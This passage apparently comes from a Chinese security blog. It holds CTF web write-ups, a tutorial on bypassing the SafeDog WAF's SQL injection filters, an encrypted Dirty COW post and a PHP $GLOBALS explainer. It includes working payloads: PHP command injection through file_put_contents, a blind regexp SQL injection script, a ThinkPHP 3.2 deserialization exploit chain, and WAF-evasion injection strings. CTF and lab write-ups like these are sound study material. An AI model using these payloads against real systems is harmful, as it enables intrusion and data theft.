<h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过一下payload可以知道路径</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">action</span>=pwd</span><br></pre></td></tr></table></figure>
<p>之后就是 <code>file_put_contents</code>利用了</p>
<p>虽然过滤了空格，我们可以通过<code>%09</code>进行绕过。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?a</span>ction=upload&amp;data=&lt;<span class="string">?=</span><span class="string">`ls%09/`</span><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可看到<code>flag</code>文件为<code>php</code>文件<code>!whatyouwantggggggg401.php</code></p>
<p>由于过滤了<code>php</code>字符，可通过<code>*</code>通配符绕过</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?a</span>ction=upload&amp;data=&lt;<span class="string">?=</span><span class="string">`cat%09/!whatyouwantggggggg401*`</span><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h1><p><img src="http://img.npfs06.top/20210407113355.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在登陆的位置存在sql注入，fuzz后发现，过滤了<code>if,空格、or,and,information,单引号,benchmark,sleep，=，li k,+,-</code>等关键字，闭合方式为双引号。</p>
<p>or和and 等逻辑运算符直接用<code>||</code>代替即可。等于号可以使用<code>regexp</code>或者<code>strcmp</code>,而字符串分割可以使用<code>locate</code>代替。<code>||</code>只要一边执行成功就能跳转到<code>home.php</code></p>
<p>输入：</p>
<figure class="highlight ldif"><table><tr><td class="code"><pre><span class="line"><span class="attribute">username</span>: npfs&quot;||0#</span><br><span class="line"><span class="attribute">password</span>: 123456</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210407114630.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>输入：</p>
<figure class="highlight ldif"><table><tr><td class="code"><pre><span class="line"><span class="attribute">username</span>: whoami&quot;||1#</span><br><span class="line"><span class="attribute">password</span>: 123456</span><br></pre></td></tr></table></figure>
<p>成功登入，跳转到home.php</p>
<p><img src="https://img.npfs06.top/20210407123509.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>盲注，因为regexp没有被过滤，考虑正则注入，但是由于又过滤了<code>-</code>等flag中可能出现的字符，所有这里我们使用hex绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">s = string.digits + string.ascii_uppercase + string.ascii_lowercase + <span class="string">&quot;-&quot;</span> + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        r = flag + i</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : <span class="string">&#x27;admin&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x&#x27;</span> + binascii.hexlify((<span class="string">&quot;^&quot;</span> + result + i).encode()).decode() + <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;home.php&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;regexp</span><br><span class="line"></span><br><span class="line">查找name字段中以&#39;st&#39;为开头的所有数据：</span><br><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#39;^st&#39;;</span><br></pre></td></tr></table></figure>


<h2 id="east-tp"><a href="#east-tp" class="headerlink" title="east_tp"></a>east_tp</h2><p>可以通过关键词搜索到ThinkPHP v3.2.* 版本的一个反序列化漏洞，基本上照着做就可以了<a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p>
<p>EXP：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="comment">// &quot;table&quot; =&gt; &quot;mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&quot;,</span></span><br><span class="line">                <span class="comment">// &quot;table&quot; =&gt; &quot;mysql.user where  1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&quot;,</span></span><br><span class="line">                <span class="comment">// &quot;table&quot; =&gt; &quot;mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&#x27;test&#x27;),0x7e),1)#&quot;,</span></span><br><span class="line">                <span class="comment">// &quot;table&quot; =&gt; &quot;mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&#x27;test&#x27;),0x7e),1)#&quot;,</span></span><br><span class="line">                 <span class="comment">//&quot;table&quot; =&gt; &quot;mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(flag),31) from test.flag),0x7e),1)#&quot;,</span></span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where  1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210416231548.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>绕最新版安全狗(20220117)</title>
    <url>/2022/01/18/%E7%BB%95%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97-20220117/</url>
    <content><![CDATA[<p>sql注入绕最新版安全狗(2022\01\17)</p>
<a id="more"></a>

<p>下载最新版安全狗，并设置防护等级为高级（2022/1/17）</p>
<img src="http://img.npfs06.top/20220118091355.png" style="zoom:80%;">

<p>网站测试脚本,用的是sqli-labs的数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line">if ($_GET[&#x27;id&#x27;]==null)&#123;$id=$_POST[&#x27;id&#x27;];&#125;</span><br><span class="line">else &#123;$id=$_GET[&#x27;id&#x27;];&#125;</span><br><span class="line">$con <span class="operator">=</span> mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">if (!$con)&#123;die(&#x27;Could not connect: &#x27; . mysql_error());&#125;</span><br><span class="line">mysql_select_db(&quot;security&quot;, $con);</span><br><span class="line">$query <span class="operator">=</span> &quot;SELECT username,password FROM users WHERE id = &#x27;$id&#x27;; &quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($query)<span class="keyword">or</span> die(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.mysql_error().<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">while($<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>))</span><br><span class="line">&#123;</span><br><span class="line"> echo $<span class="type">row</span>[<span class="string">&#x27;0&#x27;</span>] . &quot;&amp;nbsp&quot; . $<span class="type">row</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"> echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo $query;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h1><h2 id="and被拦截"><a href="#and被拦截" class="headerlink" title="and被拦截"></a>and被拦截</h2><img src="http://img.npfs06.top/20220118095904.png" style="zoom:80%;">

<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">用 <span class="string">|| 替代 and</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20220118101155.png" style="zoom:80%;">

<figure class="highlight vhdl"><table><tr><td class="code"><pre><span class="line">内联注释绕过</span><br><span class="line"><span class="number">1</span>&#x27; <span class="comment">/*!44677and*/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20220118101731.png" style="zoom:80%;">



<hr>
<h1 id="列数判断"><a href="#列数判断" class="headerlink" title="列数判断"></a>列数判断</h1><h2 id="order-by被拦截"><a href="#order-by被拦截" class="headerlink" title="order by被拦截"></a>order by被拦截</h2><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="title">by</span> 替代</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20220118101945.png" style="zoom:80%;">

<p>得到列数为2</p>
<h1 id="回显点判断"><a href="#回显点判断" class="headerlink" title="回显点判断"></a>回显点判断</h1><h2 id="union-select-被拦截"><a href="#union-select-被拦截" class="headerlink" title="union select 被拦截"></a>union select 被拦截</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">regexp</span> + 内联 + %<span class="number">0</span>a 绕过</span><br></pre></td></tr></table></figure>
<blockquote>
<p>内联注释是MySQL为了保持与其他数据兼容，将MySQL中特有的语句放在/*!…<em>/中，<br>这些语句在不兼容的数据库中不执行，而在MySQL自身却能识别，执行。<br>/\</em>!50001xxx*/表示数据库版本&gt;=5.00.01时中间的语句xxx才能被执行,否则被当作注释符</p>
</blockquote>
<img src="http://img.npfs06.top/20220118102340.png" style="zoom:80%;">

<p>得到回显点为1,2</p>
<h1 id="数据库信息查询"><a href="#数据库信息查询" class="headerlink" title="数据库信息查询"></a>数据库信息查询</h1><h2 id="括号被拦截"><a href="#括号被拦截" class="headerlink" title="括号被拦截"></a>括号被拦截</h2><img src="http://img.npfs06.top/20220118102922.png" style="zoom:80%;">

<img src="http://img.npfs06.top/20220118102946.png" style="zoom:80%;">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">内联注释垃圾字符填充绕过</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; regexp &quot;%0A%23&quot;/*44999union%0aselect*/ 1,database(/*!99999999999999999aaaaa*/)--+</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20220118103043.png" style="zoom:80%;">

<p>得到数据库名为security</p>
<p>也可以用下面的方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; regexp  &quot;%0A%23&quot; /*!44999union%0aselect*/  1,group_concat(schema_name/*999999999aaaa*/)from/*!44999 /* regexp  &quot;%0A%23&quot; */ %0a information_schema.schemata*/--+</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20220118111928.png" style="zoom:80%;">

<h1 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h1><p>用上面查数据库名的方法即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span>regexp<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">0</span>A<span class="operator">%</span><span class="number">23</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">20</span><span class="comment">/*!44999union%0aselect*/</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">201</span>,group_concat(table_name<span class="comment">/*999999999aaaa*/</span>)<span class="keyword">from</span><span class="comment">/*!44999%20/*%20regexp%20%20%22%0A%23%22%20*/</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">0</span>a<span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span><span class="operator">*</span><span class="operator">/</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20220118112155.png" style="zoom:80%;">

<h1 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h1><img src="http://img.npfs06.top/20220118112251.png" style="zoom:80%;">

<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><img src="http://img.npfs06.top/20220118112333.png" style="zoom:80%;">

]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>脏牛漏洞提权</title>
    <url>/2021/08/19/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fa446853b25ea7e2a616d2de585641af0b974e33083e5b1e42cf56c1848cab83">017cc0ab8ddab4a1475d3a5d22f989ad3a3764044a206db26374d3e3f1c043de873515d0907474978091c2bc371312fd7731f319a430416fb560771e4e338e44ae92a99a3e3178afef31336420dbb3dc1fd202d499798d0cbd15edd466c2b906dc4debd128d27f448b8ddede5bb48e992b80e0fcd99d8455d3647b6b5f529e73cc32773901f7d1591eb5290d5d139f21777012aa313060c28d078725437320264e967903ead158ef6a02f9e481019f28707a61635c40572b89cc01aca55f9a3f0f5e3b50331a35efdb2320146276440b7da4a8b882cba381b6f4bab6b8ef7cc0e72cf066781f8cbce7dd66f5fa526a0c0decb7f65a0592084d38a2f8ee602a23e40b853843f2d7bf97ca1a8a73fcbc467950e2fa4eba46d66c19ecef38f6b2b3bd89c8773d1e3bce3f7100ba3f01669c40e15567db269627d345e37a17c84221c71a4019927c678e72ee6d1b2afe01abc235665c6511d1b89af301e4c043542c85f23c94ba97ed72d7d4b96cf940c0a793cc66b8c6dcec70a0c5882246ec24a62ae36e19465d7bdc40d807968287b6f66f1e0ec973e033fea5dfafaf618f809ebcd1a97be11870d7d617d6a105df9073bb4d0cf64452af6fcdcf7f587c002c8bca7ac295cb6e069501575652e40d55a58a7480d68d8b6a60216038bec8c5b381676af9197dffd1c39fc20b041221a0d7a39893b2a6816a617f28edb875a2a8074fbf0587df346cb67fb491b9123bffc65f1fb4d9aeaa409a07b4ffae57caa2ed3f8c830398980f82d16d95b8b99839384a3410728043b462c4775b2dcf8b6e2ec5b435e83f23aba3b75b68c55317f042897ea13223ab7ad4e7a019856e63379a473d9d28064bf78c40ca4fc9f62abc4eeaa697f87a44feb4b3798346e72e7e3874787b99161c5a2627f260fc217380b405698412082b021cb99e4e86a72297b319e0aaa15a0d86a780faa03b3c8cc9c936e5933b80bb8a546eddf62e82e4b15d944719b6c715e42452c4f1921924929ed76c391bd6900b424d782e0dae92bc2ae31feb8dd9aaf1d11718639c7638db2792e7849210a572a3987a668281762e30c5204a254f998b76997d8a8eac2652f2613f90b553ae0d34c285f6b21fbdb923a5b169dd08d6b28a06037794c945be560fc730ca323394dc879d3dfbc9f826db7e0da9593ef580cabae0439805bc61faa58acefb53440a310b36eb49f683599ca369c9b804d331af4f9e6cea06d389128e4b25f2843def4fd1b8b6303095c9a61fdadfcfa24a9400faede95469d86831801281a4fe45ba45dd921c6ef14e6b9a0df2080c109ab4d6c2e42d9f65a8d9c69e685b76678d8756e282143228fa7c5500d885a0f8c0d3037c9703aacb9df26b784fa220d187e851f23f034b232342454e5474e32d807afae03bbd079936b25415f5d787b0b0e5d59259aa764d5d0adacddc10f1e2a53e45a7d43d5ab7ce475d9e5747666558e300bc34dcf346c2ad6592d4a89e31b6a21e76dbf7d90965a986f4340bc211a3baa06ae0da3155095ad9a19d2403ba3d68c305ac83f9665ad9b0fd4335807c320d676f01ab06c4b267bb</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>超全局变量$GLOBALS的应用</title>
    <url>/2020/04/17/%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>PHP中有一个鲜为人知的超全局变量$GLOBALS。<a id="more"></a></p>
<p>$GLOBALS定义：引用全局作用域中可用的全部变量(一个包含了全部变量的组合数组。变量的名字就是数组的键)，与所有其他超全局变量不同，$GLOBALS在PHP代码中的任何地方都是可用的，可以通过打印$GLOBALS变量查看结果验证。</p>
<p>在PHP生命周期中，定义在函数体外部的全局变量，函数内部是不能直接获得的。如果要在函数体内访问外部定义的全局变量，可以通过global声明或者直接使用$GLOBALS来进行访问。</p>
<p>比如:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$var1</span>=<span class="string">&#x27;www.tidesec.com&#x27;</span>;</span><br><span class="line"><span class="variable">$var2</span>=<span class="string">&#x27;www.tidesec.net&#x27;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$var1</span>=<span class="string">&#x27;tide&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var1</span>,<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var1</span>,<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;var2&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果为:</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">tide</span><br><span class="line">www<span class="selector-class">.tidesec</span>.com</span><br><span class="line">www<span class="selector-class">.tidesec</span>.net</span><br></pre></td></tr></table></figure>
<p>其中global和$GLOBALS的区别:</p>
<p>$GLOBALS[‘var’]是外部全局变量的本身，而global  $var则是外部$var的同名引用或者说是指针，也就是说global函数产生一个指向函数外部变量的别名变量，而不是真正的函数外部变量，而$GLOBALS[]确确实实调用的是外部的变量，函数内外都会始终保持一致。</p>
<p>举个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var1</span>=tide;</span><br><span class="line"><span class="variable">$var2</span>=tidesec;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;var2&#x27;</span>]=&amp;<span class="variable">$GLOBALS</span>[<span class="string">&#x27;var1&#x27;</span>];</span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var2</span>;</span><br></pre></td></tr></table></figure>
<p>结果为:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tide</span></span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var1</span>=tide;</span><br><span class="line"><span class="variable">$var2</span>=tidesec;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$var1</span>,<span class="variable">$var2</span></span><br><span class="line"><span class="variable">$var2</span>=&amp;<span class="variable">$var1</span>;</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tidesec</span></span><br></pre></td></tr></table></figure>
<p>结果之所以为tidesec，原因为$var1的引用指向了$var2的引用地址。导致实质的值没有发生变化。</p>
<hr>
